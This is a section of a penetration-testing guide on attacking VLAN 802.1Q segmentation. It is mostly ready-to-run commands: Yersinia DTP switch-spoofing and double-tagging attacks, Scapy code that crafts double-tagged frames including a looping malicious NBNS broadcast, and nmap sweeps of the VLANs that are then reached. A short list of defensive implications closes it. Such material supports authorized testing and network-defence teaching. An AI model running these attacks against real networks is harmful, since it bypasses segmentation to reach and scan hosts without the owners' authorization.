# 11. VLAN TAGGING (802.1Q) - COMPLETE ATTACK CHAIN <a name="vlan"></a>

## 11.1 THEORY & BACKGROUND

**VLAN (Virtual LAN)**:
- **Purpose**: Network segmentation at Layer 2
- **Standard**: IEEE 802.1Q
- **Tagging**: 4-byte tag in Ethernet frame
- **VLAN ID**: 12-bit field (0-4095)
- **Security**: Separates broadcast domains, access control

**802.1Q Frame**:
```
| Dest MAC | Src MAC | 802.1Q Tag | Type | Data | FCS |
                      | TPID | PCP | DEI | VID |
                       0x8100
```

**TPID**: Tag Protocol Identifier (0x8100)
**PCP**: Priority Code Point (3 bits)
**DEI**: Drop Eligible Indicator (1 bit)
**VID**: VLAN Identifier (12 bits)

---

## 11.2 ENUMERATION PHASE

### 11.2.1 VLAN Discovery

**Passive VLAN Discovery:**
```bash
# Capture traffic and analyze:
tcpdump -i eth0 -e -n
# Look for 802.1Q headers in output

# Wireshark:
wireshark -i eth0
# Display filter: vlan
# See VLAN IDs in captured traffic

# Tshark:
tshark -i eth0 -Y vlan -T fields -e vlan.id
# Lists all VLAN IDs observed

# Extended capture:
tcpdump -i eth0 -e -n vlan and icmp -w vlan_traffic.pcap

# Analyze in Wireshark:
# Statistics → Conversations → VLAN tab
# Shows all VLANs present

# Count VLANs:
tshark -r vlan_traffic.pcap -T fields -e vlan.id | sort -u

# Yersinia for CDP/DTP/VTP sniffing:
yersinia -G  # GUI mode
# Enable capture on DTP, VTP, CDP
# Analyzes trunking protocols to discover VLANs
```

**Active VLAN Discovery (with DTP):**
```bash
# Using Yersinia:
yersinia -G
# Attack → DTP → Send DTP desirable
# Forces switch to trunk mode, reveals VLANs

# Or command line:
yersinia dtp -attack 1 -interface eth0

# Frogger (automated VLAN hopping tool):
git clone https://github.com/nccgroup/vlan-hopping---frogger
cd vlan-hopping---frogger
./frogger.sh

# Scapy for crafting DTP:
scapy
>>> packet = Ether(dst="01:00:0c:cc:cc:cc")/LLC()/SNAP()/DTP()
>>> sendp(packet, iface="eth0")
```

**CDP/LLDP for VLAN Info:**
```bash
# CDP (Cisco Discovery Protocol):
tcpdump -i eth0 -vv -nn -c 10 ether dst 01:00:0c:cc:cc:cc
# Captures CDP packets showing native VLAN

# Parse with tshark:
tshark -i eth0 -Y "cdp" -V | grep -i vlan

# LLDP (Link Layer Discovery Protocol):
tcpdump -i eth0 -vv -nn -c 10 ether dst 01:80:c2:00:00:0e
tshark -i eth0 -Y "lldp" -V | grep -i vlan

# Yersinia to send CDP:
yersinia cdp -attack 1 -interface eth0
```

### 11.2.2 Identify Native VLAN

**Methods:**
```bash
# Method 1: Double tagging (covered in exploitation)

# Method 2: CDP/DTP observation
# CDP announces native VLAN
tshark -i eth0 -Y "cdp" -T fields -e cdp.nativevlan

# Method 3: Trial and error
# Send untagged traffic, see if it reaches destination
# If yes, you're on native VLAN

# Method 4: DHCP discovery
# Request DHCP on different VLANs
for vlan in {1..100}; do
    dhclient -v vlan.$vlan 2>&1 | grep -i "DHCPOFFER" && echo "VLAN $vlan has DHCP"
done
```

---

## 11.3 EXPLOITATION PHASE

### 11.3.1 VLAN Hopping Attacks

**Attack 1: Switch Spoofing (DTP Exploit)**

```bash
# Prerequisites:
# - Port in dynamic trunking mode
# - DTP enabled on switch

# Using Yersinia:
yersinia -G
# Select DTP attack
# Send "DTP desirable" frames
# Port becomes trunk → access to all VLANs!

# Command line:
yersinia dtp -attack 1 -interface eth0

# Verify trunking:
# Your port should now trunk, see 802.1Q tags in traffic:
tcpdump -i eth0 -e -n vlan

# Access different VLANs:
# Create virtual interfaces for each VLAN:
ip link add link eth0 name eth0.10 type vlan id 10
ip link add link eth0 name eth0.20 type vlan id 20
ip link add link eth0 name eth0.100 type vlan id 100

ip link set eth0.10 up
ip link set eth0.20 up
ip link set eth0.100 up

# Request DHCP on each:
dhclient eth0.10
dhclient eth0.20
dhclient eth0.100

# Now can access devices on VLANs 10, 20, 100!
ip addr
# Shows IPs on each VLAN

# Scan each VLAN:
nmap -sn 192.168.10.0/24  # VLAN 10
nmap -sn 192.168.20.0/24  # VLAN 20
nmap -sn 192.168.100.0/24 # VLAN 100
```

**Attack 2: Double Tagging**

```bash
# Prerequisites:
# - Attacker on native VLAN
# - Target on different VLAN
# - Switch doesn't remove outer tag

# Theory:
# Create frame with TWO 802.1Q tags
# Outer tag = native VLAN (removed by first switch)
# Inner tag = target VLAN (forwarded to target VLAN)

# Using Scapy:
scapy
>>> outer_vlan = 1  # Native VLAN
>>> inner_vlan = 100  # Target VLAN
>>> packet = Ether(dst="victim_mac")/Dot1Q(vlan=outer_vlan)/Dot1Q(vlan=inner_vlan)/IP(dst="192.168.100.50")/ICMP()
>>> sendp(packet, iface="eth0")

# Limitation: ONE-WAY traffic only (no return path)
# Useful for: UDP attacks, broadcasting malicious traffic

# Automated tool - Yersinia:
yersinia dot1q -attack 2 -source <attacker_mac> -dest <victim_mac> -interface eth0

# Practical example: Send malicious broadcast
>>> packet = Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="192.168.100.255")/UDP(dport=137)/NBNSQueryRequest()
>>> sendp(packet, iface="eth0", loop=1)
# Sends NBNS queries to all hosts on VLAN 100
```

### 11.3.2 Connecting to Specific VLAN

**From Linux:**

```bash
# Load 802.1Q module:
modprobe 8021q

# Create VLAN interface:
ip link add link eth0 name eth0.100 type vlan id 100

# Alternative (older method):
vconfig add eth0 100

# Bring up interface:
ip link set eth0.100 up

# Assign IP (static):
ip addr add 192.168.100.50/24 dev eth0.100

# Or DHCP:
dhclient eth0.100

# Set default route:
ip route add default via 192.168.100.1 dev eth0.100

# Verify:
ip addr show eth0.100
ping 192.168.100.1

# Multiple VLANs:
for vlan in 10 20 30 100; do
    ip link add link eth0 name eth0.$vlan type vlan id $vlan
    ip link set eth0.$vlan up
    dhclient eth0.$vlan &
done

# Delete VLAN interface:
ip link delete eth0.100
```

**From Windows:**

```powershell
# Using Hyper-V (if available):
Add-VMNetworkAdapter -VMName "Windows10" -SwitchName "External" -VlanId 100

# Using advanced network adapter settings:
# 1. Open Network Adapter properties
# 2. Configure → Advanced tab
# 3. Look for VLAN ID setting
# 4. Set VLAN ID to desired value

# PowerShell (if driver supports):
Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "VLAN ID" -DisplayValue "100"

# Verify:
Get-NetAdapterAdvancedProperty -Name "Ethernet" | Where-Object {$_.DisplayName -like "*VLAN*"}

# Alternative: Use Linux VM or tools like vlan-tagging utilities
```

**Testing VLAN Connectivity:**
```bash
# Ping default gateway:
ping -I eth0.100 192.168.100.1

# Scan VLAN:
nmap -e eth0.100 -sn 192.168.100.0/24

# Full scan:
nmap -e eth0.100 -p- -A 192.168.100.0/24

# Verify traffic is tagged:
tcpdump -i eth0 -e -n vlan 100
# Should see outgoing packets with VLAN 100 tag
```

---

## 11.4 ANALYZING VLAN TRAFFIC

**Capture VLAN Traffic:**
```bash
# Capture all VLANs:
tcpdump -i eth0 -e -n -w all_vlans.pcap

# Capture specific VLAN:
tcpdump -i eth0 -e -n vlan 100 -w vlan100.pcap

# Wireshark display filter:
vlan.id == 100

# Show only traffic from specific VLAN:
tshark -r capture.pcap -Y "vlan.id == 100"

# Extract VLAN IDs:
tshark -r capture.pcap -T fields -e vlan.id | sort -u

# Count packets per VLAN:
tshark -r capture.pcap -T fields -e vlan.id | sort | uniq -c | sort -nr

# Analyze VLAN priorities:
tshark -r capture.pcap -T fields -e vlan.priority -e vlan.id

# Save traffic per VLAN:
for vlan in 10 20 100; do
    tshark -r all_vlans.pcap -Y "vlan.id == $vlan" -w vlan_$vlan.pcap
done
```

**Security Implications:**
- VLANs provide isolation ONLY at Layer 2
- Routing between VLANs still possible if configured
- VLAN hopping bypasses segmentation
- Native VLAN is critical attack vector
- DTP should be disabled on access ports
- 802.1X provides better access control than VLANs alone

---
